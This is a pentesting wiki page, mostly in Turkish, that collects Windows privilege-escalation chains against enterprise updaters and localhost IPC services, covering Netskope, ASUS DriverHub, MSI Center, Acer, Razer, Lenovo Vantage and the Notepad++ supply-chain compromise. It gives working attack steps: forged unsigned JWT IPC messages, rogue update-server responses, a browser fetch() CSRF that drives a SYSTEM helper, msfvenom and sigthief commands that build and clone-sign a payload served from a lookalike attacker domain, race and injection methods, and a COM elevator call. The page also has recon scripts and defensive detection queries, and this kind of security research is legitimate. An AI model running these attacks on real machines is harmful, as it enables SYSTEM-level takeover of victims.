# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Bu sayfa, low-friction bir IPC surface ve privileged bir update flow açığa çıkaran enterprise endpoint agents ve updaters içinde bulunan Windows local privilege escalation zincirlerinin bir sınıfını geneller. Temsili bir örnek, Netskope Client for Windows < R129 (CVE-2025-0309)’dur; burada düşük ayrıcalıklı bir kullanıcı, enrollment’ı attacker-controlled bir server’a zorlayabilir ve ardından SYSTEM service’in kuracağı malicious bir MSI teslim edebilir.

Yeniden kullanılabilecek temel fikirler:
- Privileged bir service’in localhost IPC’sini abuse ederek re-enrollment veya attacker server’a reconfiguration zorla.
- Vendor’ın update endpoints’ini implement et, rogue Trusted Root CA teslim et ve updater’ı malicious, “signed” bir package’a yönlendir.
- Zayıf signer checks (CN allow-lists), optional digest flags ve lax MSI properties’i evade et.
- Eğer IPC “encrypted” ise, registry’de depolanan world-readable machine identifiers’dan key/IV türet.
- Eğer service çağıranları image path/process name ile kısıtlıyorsa, allow-listed bir process’e inject et veya birini suspended olarak spawn et ve minimal bir thread-context patch ile DLL’ini bootstrap et.

---
## 1) localhost IPC üzerinden bir attacker server’a enrollment zorlamak

Birçok agent, localhost TCP üzerinden JSON kullanarak SYSTEM service ile konuşan user-mode bir UI process ile gelir.

Netskope’da gözlemlenen:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit akışı:
1) backend host’u kontrol eden claim’lere sahip bir JWT enrollment token oluştur (ör. AddonUrl). İmza gerekmemesi için alg=None kullan.
2) JWT ve tenant adıyla provisioning command’ını çağıran IPC mesajını gönder:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Servis, enrollment/config için rogue sunucunuza istek atmaya başlar, örn.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notlar:
- Eğer caller verification path/name-based ise, isteği allow-listed bir vendor binary’den başlatın (bkz. §4).

---
## 2) Update channel’ını hijack ederek code’u SYSTEM olarak çalıştırmak

Client sunucunuzla konuşmaya başladıktan sonra, beklenen endpoints’i implement edin ve onu attacker MSI’a yönlendirin. Tipik sıra:

1) /v2/config/org/clientconfig → Çok kısa bir updater interval’i olan JSON config döndürün, örn.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Bir PEM CA certificate döndürür. Servis bunu Local Machine Trusted Root store içine kurar.
3) /v2/checkupdate → Kötü amaçlı bir MSI ve sahte bir version işaret eden metadata sağlar.

Wild'da görülen yaygın kontrolleri bypass etme:
- Signer CN allow-list: servis yalnızca Subject CN değerinin “netSkope Inc” veya “Netskope, Inc.” olup olmadığını kontrol edebilir. Sahte CA’nız bu CN ile bir leaf çıkarıp MSI’ı imzalayabilir.
- CERT_DIGEST property: CERT_DIGEST adlı zararsız bir MSI property ekleyin. Install sırasında enforcement yok.
- Optional digest enforcement: config flag (ör. check_msi_digest=false) ek kriptografik doğrulamayı devre dışı bırakır.

Sonuç: SYSTEM service, MSI’nızı şuradan kurar:
C:\ProgramData\Netskope\stAgent\data\*.msi
ve NT AUTHORITY\SYSTEM olarak arbitrary code çalıştırır.

Patch-bypass dersi: bir vendor, update kaynağını kriptografik olarak doğrulamak yerine küçük bir “trusted” domain setini allow-list'lerse, traffic'i hâlâ yönlendirmenize izin veren vendor-owned redirector veya reverse proxy’leri arayın. Netskope örneğinde, public follow-up research R129 dönemine ait bir allow-list’in hâlâ `rproxy.goskope.com` üzerinden abuse edilebildiğini gösterdi; bu da attacker-controlled Azure App Service content’i proxylüyordu. Hostname allow-list’leri bir trust boundary değil, sadece bir hız tümseği olarak görün.

---
## 3) Şifrelenmiş IPC requests forgery (varsa)

R127’den itibaren Netskope, IPC JSON’u Base64 gibi görünen bir encryptData field içinde sardı. Reverse engineering, herhangi bir kullanıcının okuyabileceği registry değerlerinden türetilen key/IV ile AES kullandığını gösterdi:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attacker'lar şifrelemeyi yeniden üretebilir ve standart bir user olarak geçerli şifreli commands gönderebilir. Genel ipucu: bir agent aniden IPC’sini “encrypt” etmeye başlarsa, HKLM altında device IDs, product GUID’ler, install IDs gibi materyalleri arayın.

---
## 4) IPC caller allow-list'lerini bypass etme (path/name checks)

Bazı servisler, TCP connection’ın PID’sini çözüp image path/name’i Program Files altında bulunan allow-listed vendor binary’leriyle karşılaştırarak peer’ı authenticate etmeye çalışır (ör. stagentui.exe, bwansvc.exe, epdlp.exe).

İki pratik bypass:
- Allow-listed bir process içine DLL injection yapıp IPC’yi içinden proxy etmek (ör. nsdiag.exe).
- CreateRemoteThread kullanmadan allow-listed bir binary’yi suspended başlatıp proxy DLL’inizi bootstrap etmek (bkz. §5); böylece driver-enforced tamper kurallarını sağlarsınız.

---
## 5) Tamper-protection dostu injection: suspended process + NtContinue patch

Ürünler çoğu zaman protected processes’e ait handle’lardan tehlikeli rights’ları kaldırmak için bir minifilter/OB callbacks driver (ör. Stadrv) ile gelir:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME kaldırılır
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE ile sınırlandırılır

Bu kısıtlamalara uyan güvenilir bir user-mode loader:
1) CREATE_SUSPENDED ile bir vendor binary’si için CreateProcess yapın.
2) Hâlâ izin verilen handle’ları alın: process için PROCESS_VM_WRITE | PROCESS_VM_OPERATION ve thread handle için THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (veya code’u bilinen bir RIP’de patch’liyorsanız sadece THREAD_RESUME).
3) ntdll!NtContinue’u (veya başka bir erken, garanti-mapped thunk’u) sizin DLL path’inizde LoadLibraryW çağıran küçük bir stub ile overwrite edin, sonra geri atlayın.
4) Stub’ınızı process içinde tetiklemek için ResumeThread kullanın ve DLL’inizi yükleyin.

Siz zaten korunmuş bir process üzerinde PROCESS_CREATE_THREAD veya PROCESS_SUSPEND_RESUME kullanmadığınız için (process’i siz oluşturduğunuzdan) driver’ın policy’si sağlanır.

---
## 6) Pratik tooling
- NachoVPN (Netskope plugin), rogue bir CA, malicious MSI signing işlemini otomatikleştirir ve gereken endpoint’leri sunar: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope, arbitrary (isteğe bağlı AES-encrypted) IPC messages craft eden ve allow-listed bir binary’den geliyormuş gibi göstermek için suspended-process injection içeren özel bir IPC client’tır.

## 7) Unknown updater/IPC surfaces için hızlı triage workflow

Yeni bir endpoint agent veya motherboard “helper” suite ile karşılaştığınızda, kısa bir workflow genellikle bunun umut verici bir privesc target olup olmadığını anlamak için yeterlidir:

1) Loopback listener’ları enumerate edin ve bunları vendor processes’e map edin:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Aday named pipes'ları enumerate et:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Plugin tabanlı IPC servers tarafından kullanılan registry-backed routing data'yı çıkarın:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Önce user-mode client’tan endpoint names, JSON keys ve command IDs çıkarın. Packed Electron/.NET frontends sıklıkla tam schema’yı leak eder:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Süreci sonunda başlatan code path'i değil, asıl trust predicate'i avla:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Önceliklendirmeye değer desenler:
- `CryptQueryObject`/`WinVerifyTrust` olmadan certificate parsing, genellikle “certificate exists” ifadesinin “certificate is trusted” gibi ele alındığı anlamına gelir; bu da certificate cloning veya diğer fake-signer hilelerini mümkün kılar.
- `Origin`, `Referer`, download URL’leri, process name’ler veya signer CN’ler üzerinde yapılan substring/suffix kontrolleri authentication değildir. `contains(".vendor.com")` çoğunlukla attacker-controlled lookalike domain’lerle istismar edilebilir.
- Düşük yetkili GUI “file is trusted” kararını veriyor ve SYSTEM broker sadece bu sonucu tüketiyorsa, client-side DLL/JS’i patch etmek veya yeniden implemente etmek çoğu zaman boundary’yi tamamen bypass eder (Razer-style split validation).
- Broker bir payload’ı `%TEMP%`/`C:\Windows\Temp` içine kopyalayıp sonra onu bu path’ten validate ediyor veya schedule ediyorsa, hemen TOCTOU replacement window’larını ve daha zayıf checks içeren alternate `ExecuteTask()` wrapper’ları açığa çıkaran sibling plugin module’leri test edin.

Named-pipe ağırlıklı hedeflerde PipeViewer, protocol’ü derinlemesine reverse etmeye başlamadan önce zayıf DACL’leri ve remotely reachable pipes’ları hızlıca tespit etmek için iyi bir yoldur.

Hedef caller’ları yalnızca PID, image path veya process name ile authenticate ediyorsa, bunu bir boundary’den çok bir speed bump olarak değerlendirin: legitimate client içine inject etmek veya connection’ı allow-listed bir process üzerinden kurmak çoğu zaman server’ın checks’lerini karşılamak için yeterlidir. Named pipes için özellikle, [client impersonation ve pipe abuse hakkında bu sayfa](named-pipe-client-impersonation.md) primitive’i daha ayrıntılı ele alır.

---
## 8) Sadece vendor signatures ile authenticate olan modular add-in broker’lar (Lenovo Vantage pattern)

Avlanmaya değer daha yeni bir varyasyon **signed-client RPC broker**’dır: düşük yetkili, Lenovo-signed bir desktop process SYSTEM service ile konuşur ve service JSON commands’ları `%ProgramData%` altındaki XML ile tanımlanmış bir grup add-in’e yönlendirir. Accepted signed client’lardan herhangi birinin **içinde code execution** elde edildiğinde, `runas="system"` olan her contract attack surface’inizin bir parçası olur.

Lenovo Vantage araştırmalarında gözlemlenen yüksek değerli primitive’ler:
- **Caller’a vendor tarafından signed olduğu için güvenmek**: araştırmacılar, bir Lenovo-signed EXE’yi writable bir directory’ye kopyalayıp bir DLL side-load (`profapi.dll`) koşulunu sağlayarak authenticated context’e ulaştı; böylece service’in zaten trusted olduğu bir client’ın içinde arbitrary code çalıştı.
- **Manifest-driven attack surface discovery**: add-in’ler `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` altında tanımlanır; birkaç contract `SYSTEM` olarak çalışır, bu yüzden bu manifest’leri enumerate etmek çoğu zaman broker’ın kendisini reverse etmekten daha hızlı biçimde gerçek privileged verbs’i ortaya çıkarır.
- **Authenticated channel arkasındaki per-command bugs**: trusted client’ın içine girdikten sonra public research path-traversal + race conditions’ı update/install verbs’lerinde, privileged settings databases üzerinde raw-SQL abuse’u ve intended hive dışına yazmayı mümkün kılan substring tabanlı registry path checks’i buldu.

Hedef üzerinde faydalı recon:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Pratik çıkarım: bir yardımcı paket, önce **caller process**’i kimlik doğrulayan ve ardından düzinelerce plugin/add-in komutuna yönlendiren bir broker sunduğunda, ön kapı trust check’ini aşınca durmayın. Manifest/contract tablosunu dump edin ve her yüksek-privilege fiili bağımsız olarak fuzz edin; authenticated channel genellikle birkaç ikinci aşama bug’ı gizler.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub, 127.0.0.1:53000 üzerinde, browser çağrılarının https://driverhub.asus.com adresinden geldiğini varsayan user-mode bir HTTP service (ADU.exe) ile gelir. Origin filter, yalnızca Origin header’ı üzerinde ve `/asus/v1.0/*` tarafından açığa çıkarılan download URL’leri üzerinde `string_contains(".asus.com")` uygular. Bu nedenle `https://driverhub.asus.com.attacker.tld` gibi saldırgan kontrollü herhangi bir host kontrolü geçer ve JavaScript’ten state-changing requests gönderebilir. Ek bypass kalıpları için [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) bölümüne bakın.

Pratik akış:
1) `.asus.com` içeren bir domain kaydedin ve orada kötü amaçlı bir webpage barındırın.
2) `fetch` veya XHR kullanarak `http://127.0.0.1:53000` üzerindeki privileged endpoint’lerden birini (ör. `Reboot`, `UpdateApp`) çağırın.
3) Handler’ın beklediği JSON body’yi gönderin – packed frontend JS aşağıdaki schema’yı gösterir.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Aşağıda gösterilen PowerShell CLI bile, Origin header güvenilir değere spoof edildiğinde başarılı olur:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` JSON body içinde tanımlanan arbitrary executables dosyalarını indirir ve bunları `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` içine cache’ler. Download URL validation aynı substring logic’i yeniden kullanır, bu yüzden `http://updates.asus.com.attacker.tld:8000/payload.exe` kabul edilir. Download sonrasında ADU.exe yalnızca PE içinde bir signature bulunduğunu ve Subject string’inin ASUS ile eşleştiğini kontrol eder, ardından çalıştırır – `WinVerifyTrust` yok, chain validation yok.

Bu akışı weaponize etmek için:
1) Bir payload oluşturun (ör. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) ASUS’un signer’ını buna clone edin (ör. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) `pwn.exe` dosyasını `.asus.com` benzeri bir domain üzerinde host edin ve yukarıdaki browser CSRF ile UpdateApp’i tetikleyin.

Hem Origin hem de URL filter’ları substring-based olduğu ve signer check yalnızca string’leri karşılaştırdığı için, DriverHub attacker binary’sini elevated context altında çeker ve çalıştırır.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’ın SYSTEM service’i, her frame’in `4-byte ComponentID || 8-byte CommandID || ASCII arguments` olduğu bir TCP protocol açığa çıkarır. Core component (Component ID `0f 27 00 00`), `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` ile gelir. Handler’ı:
1) Verilen executable’ı `C:\Windows\Temp\MSI Center SDK.exe` konumuna kopyalar.
2) `CS_CommonAPI.EX_CA::Verify` üzerinden signature doğrulaması yapar (certificate subject “MICRO-STAR INTERNATIONAL CO., LTD.” ile eşleşmeli ve `WinVerifyTrust` başarılı olmalı).
3) Temp file’ı attacker-controlled arguments ile SYSTEM olarak çalıştıran bir scheduled task oluşturur.

Kopyalanan file, verification ile `ExecuteTask()` arasında locked değildir. Bir attacker:
- Geçerli MSI-signed bir binary’ye işaret eden Frame A gönderebilir (signature check’in geçmesini ve task’in queue’ya alınmasını garanti eder).
- Bunu, malicious payload’a işaret eden tekrar eden Frame B mesajlarıyla race eder ve `MSI Center SDK.exe` dosyasını verification tamamlandıktan hemen sonra overwrite edebilir.

Scheduler çalıştığında, orijinal file doğrulanmış olsa bile overwrite edilmiş payload’ı SYSTEM altında çalıştırır. Güvenilir exploitation için, TOCTOU window kazanılana kadar `CMD_AutoUpdateSDK` spam’leyen iki goroutine/thread kullanılır.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- `MSI.CentralServer.exe` tarafından yüklenen her plugin/DLL, `HKLM\SOFTWARE\MSI\MSI_CentralServer` altında saklanan bir Component ID alır. Bir frame’in ilk 4 byte’ı o component’i seçer ve attacker’ların komutları arbitrary module’lara yönlendirmesine izin verir.
- Plugins kendi task runner’larını tanımlayabilir. `Support\API_Support.dll`, `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` açığa çıkarır ve doğrudan `API_Support.EX_Task::ExecuteTask()` çağırır; **signature validation yoktur** – herhangi bir local user bunu `C:\Users\<user>\Desktop\payload.exe` yoluna yönlendirip deterministik biçimde SYSTEM execution elde edebilir.
- Wireshark ile loopback sniff etmek veya dnSpy içinde .NET binary’lerini instrument etmek Component ↔ command mapping’i hızlıca ortaya çıkarır; ardından custom Go/ Python client’ları frame’leri replay edebilir.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) `\\.\pipe\treadstone_service_LightMode` pipe’ını açığa çıkarır ve discretionary ACL remote clients’e izin verir (ör. `\\TARGET\pipe\treadstone_service_LightMode`). Command ID `7` ile bir file path göndermek, service’in process-spawning routine’ini çağırır.
- Client library, args ile birlikte magic terminator byte’ı (113) serileştirir. Frida/`TsDotNetLib` ile yapılan dynamic instrumentation (instrumentation ipuçları için [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) bölümüne bakın) native handler’ın bu değeri `SECURITY_IMPERSONATION_LEVEL` ve integrity SID’e map ettiğini, ardından `CreateProcessAsUser` çağırdığını gösterir.
- 113 (`0x71`) yerine 114 (`0x72`) koymak, generic branch’e düşer; bu branch tam SYSTEM token’ı korur ve high-integrity SID (`S-1-16-12288`) ayarlar. Bu yüzden spawned binary hem local hem de cross-machine olarak unrestricted SYSTEM altında çalışır.
- Bunu exposed installer flag’i (`Setup.exe -nocheck`) ile birleştirerek ACC’yi lab VM’lerde bile ayağa kaldırabilir ve vendor hardware olmadan pipe’ı test edebilirsiniz.

Bu IPC bug’ları, localhost services’in neden mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filter’ları, token filtering) zorunlu kılması gerektiğini ve her module’ün “run arbitrary binary” helper’ının neden aynı signer verification’ları paylaşması gerektiğini gösterir.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 bu aileye bir başka yararlı pattern ekledi: düşük yetkili bir user, `RzUtility.Elevator` üzerinden bir process başlatmak için COM helper’a istekte bulunabilir; burada trust kararı privileged boundary içinde sağlam biçimde uygulanmak yerine user-mode DLL (`simple_service.dll`) üzerine bırakılmıştır.

Gözlemlenen exploitation path:
- COM object `RzUtility.Elevator` instantiate edilir.
- Yükseltilmiş bir launch talep etmek için `LaunchProcessNoWait(<path>, "", 1)` çağrılır.
- Public PoC’de, request gönderilmeden önce `simple_service.dll` içindeki PE-signature gate patch edilir; böylece attacker’ın seçtiği arbitrary executable başlatılabilir.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Genel çıkarım: “helper” suite’leri reverse ederken, yalnızca localhost TCP veya named pipe’larda durmayın. `Elevator`, `Launcher`, `Updater` veya `Utility` gibi isimlere sahip COM sınıflarını kontrol edin, ardından privileged service’in gerçekten hedef binary’yi doğrulayıp doğrulamadığını ya da sadece patch edilebilir user-mode client DLL tarafından hesaplanan bir sonuca güvenip güvenmediğini doğrulayın. Bu desen Razer’ın ötesine genellenir: yüksek yetkili broker’ın low-privilege taraftan bir allow/deny kararı tükettiği herhangi bir split design, bir privesc surface adayıdır.

---
## Weak updater validation üzerinden remote supply-chain hijack (WinGUp / Notepad++)

Haziran 2025 ile Aralık 2025 arasında, Notepad++ update flow’unun arkasındaki hosting infrastructure’ı ele geçiren saldırganlar, seçilmiş kurbanlara seçici olarak malicious manifest’ler servis etti. Eski WinGUp tabanlı updater’lar update authenticity’yi tam olarak verify etmiyordu, bu yüzden hostile bir XML response client’ları attacker-controlled URL’lere yönlendirebiliyordu. Client, indirilmiş installer üzerinde hem trusted certificate chain’i hem de valid PE signature’ı zorlamadan HTTPS içeriğini kabul ettiği için, kurbanlar trojanized NSIS `update.exe` dosyasını indirdi ve çalıştırdı.

Operasyonel akış (local exploit gerekmez):
1. **Infrastructure interception**: CDN/hosting’i compromise et ve update kontrollerine attacker metadata ile, malicious download URL’sini işaret edecek şekilde cevap ver.
2. **Trojanized NSIS**: installer bir payload indirir/çalıştırır ve iki execution chain’i kötüye kullanır:
- **Bring-your-own signed binary + sideload**: imzalı Bitdefender `BluetoothService.exe` dosyasını paketle ve search path’ine malicious `log.dll` bırak. İmzalı binary çalıştığında Windows `log.dll`’yi sideload eder; bu DLL Chrysalis backdoor’u decrypt eder ve reflectively load eder (Warbird-protected + static detection’ı zorlaştırmak için API hashing).
- **Scripted shellcode injection**: NSIS, `EnumWindowStationsW` gibi Win32 API’lerini kullanan compiled Lua script’i çalıştırır ve shellcode inject ederek Cobalt Strike Beacon’ı stage eder.

Herhangi bir auto-updater için hardening/detection çıkarımları:
- İndirilen installer için **certificate + signature verification** zorunlu kılın (vendor signer’ı pinleyin, uyumsuz CN/chain’i reddedin) ve update manifest’inin kendisini de imzalayın (ör. XMLDSig). Doğrulanmadıkça manifest-controlled redirect’leri engelleyin.
- **BYO signed binary sideloading**’i download sonrası bir detection pivot’u olarak değerlendirin: imzalı bir vendor EXE’nin canonical install path dışından bir DLL adı yüklemesi durumunda alarm üretin (ör. Bitdefender’ın `log.dll`’yi Temp/Downloads’tan yüklemesi) ve bir updater’ın temp’ten vendor dışı signature’lara sahip installer’ları bırakıp çalıştırdığı durumları izleyin.
- Bu zincirde gözlenen **malware-specific artifacts**’i izleyin (genel pivot olarak kullanışlıdır): `Global\Jdhfv_1.0.1` mutex’i, `%TEMP%` içine yapılan anormal `gup.exe` yazmaları ve Lua-driven shellcode injection aşamaları.
- Notepad++ buna karşı WinGUp’i v8.8.9 ve sonrasında güçlendirdi: dönen XML artık imzalı (XMLDSig) ve yeni sürümler yalnızca transport’a güvenmek yerine indirilen installer için certificate + signature verification uyguluyor.

<details>
<summary>Cortex XDR XQL – Bitdefender-imzalı EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> launching a non-Notepad++ installer</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Bu kalıplar, imzasız manifestleri kabul eden veya installer imzalayanlarını pinlemeyen herhangi bir updater için genellenebilir—network hijack + malicious installer + BYO-signed sideloading, “güvenilir” updates kisvesi altında remote code execution ile sonuçlanır.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
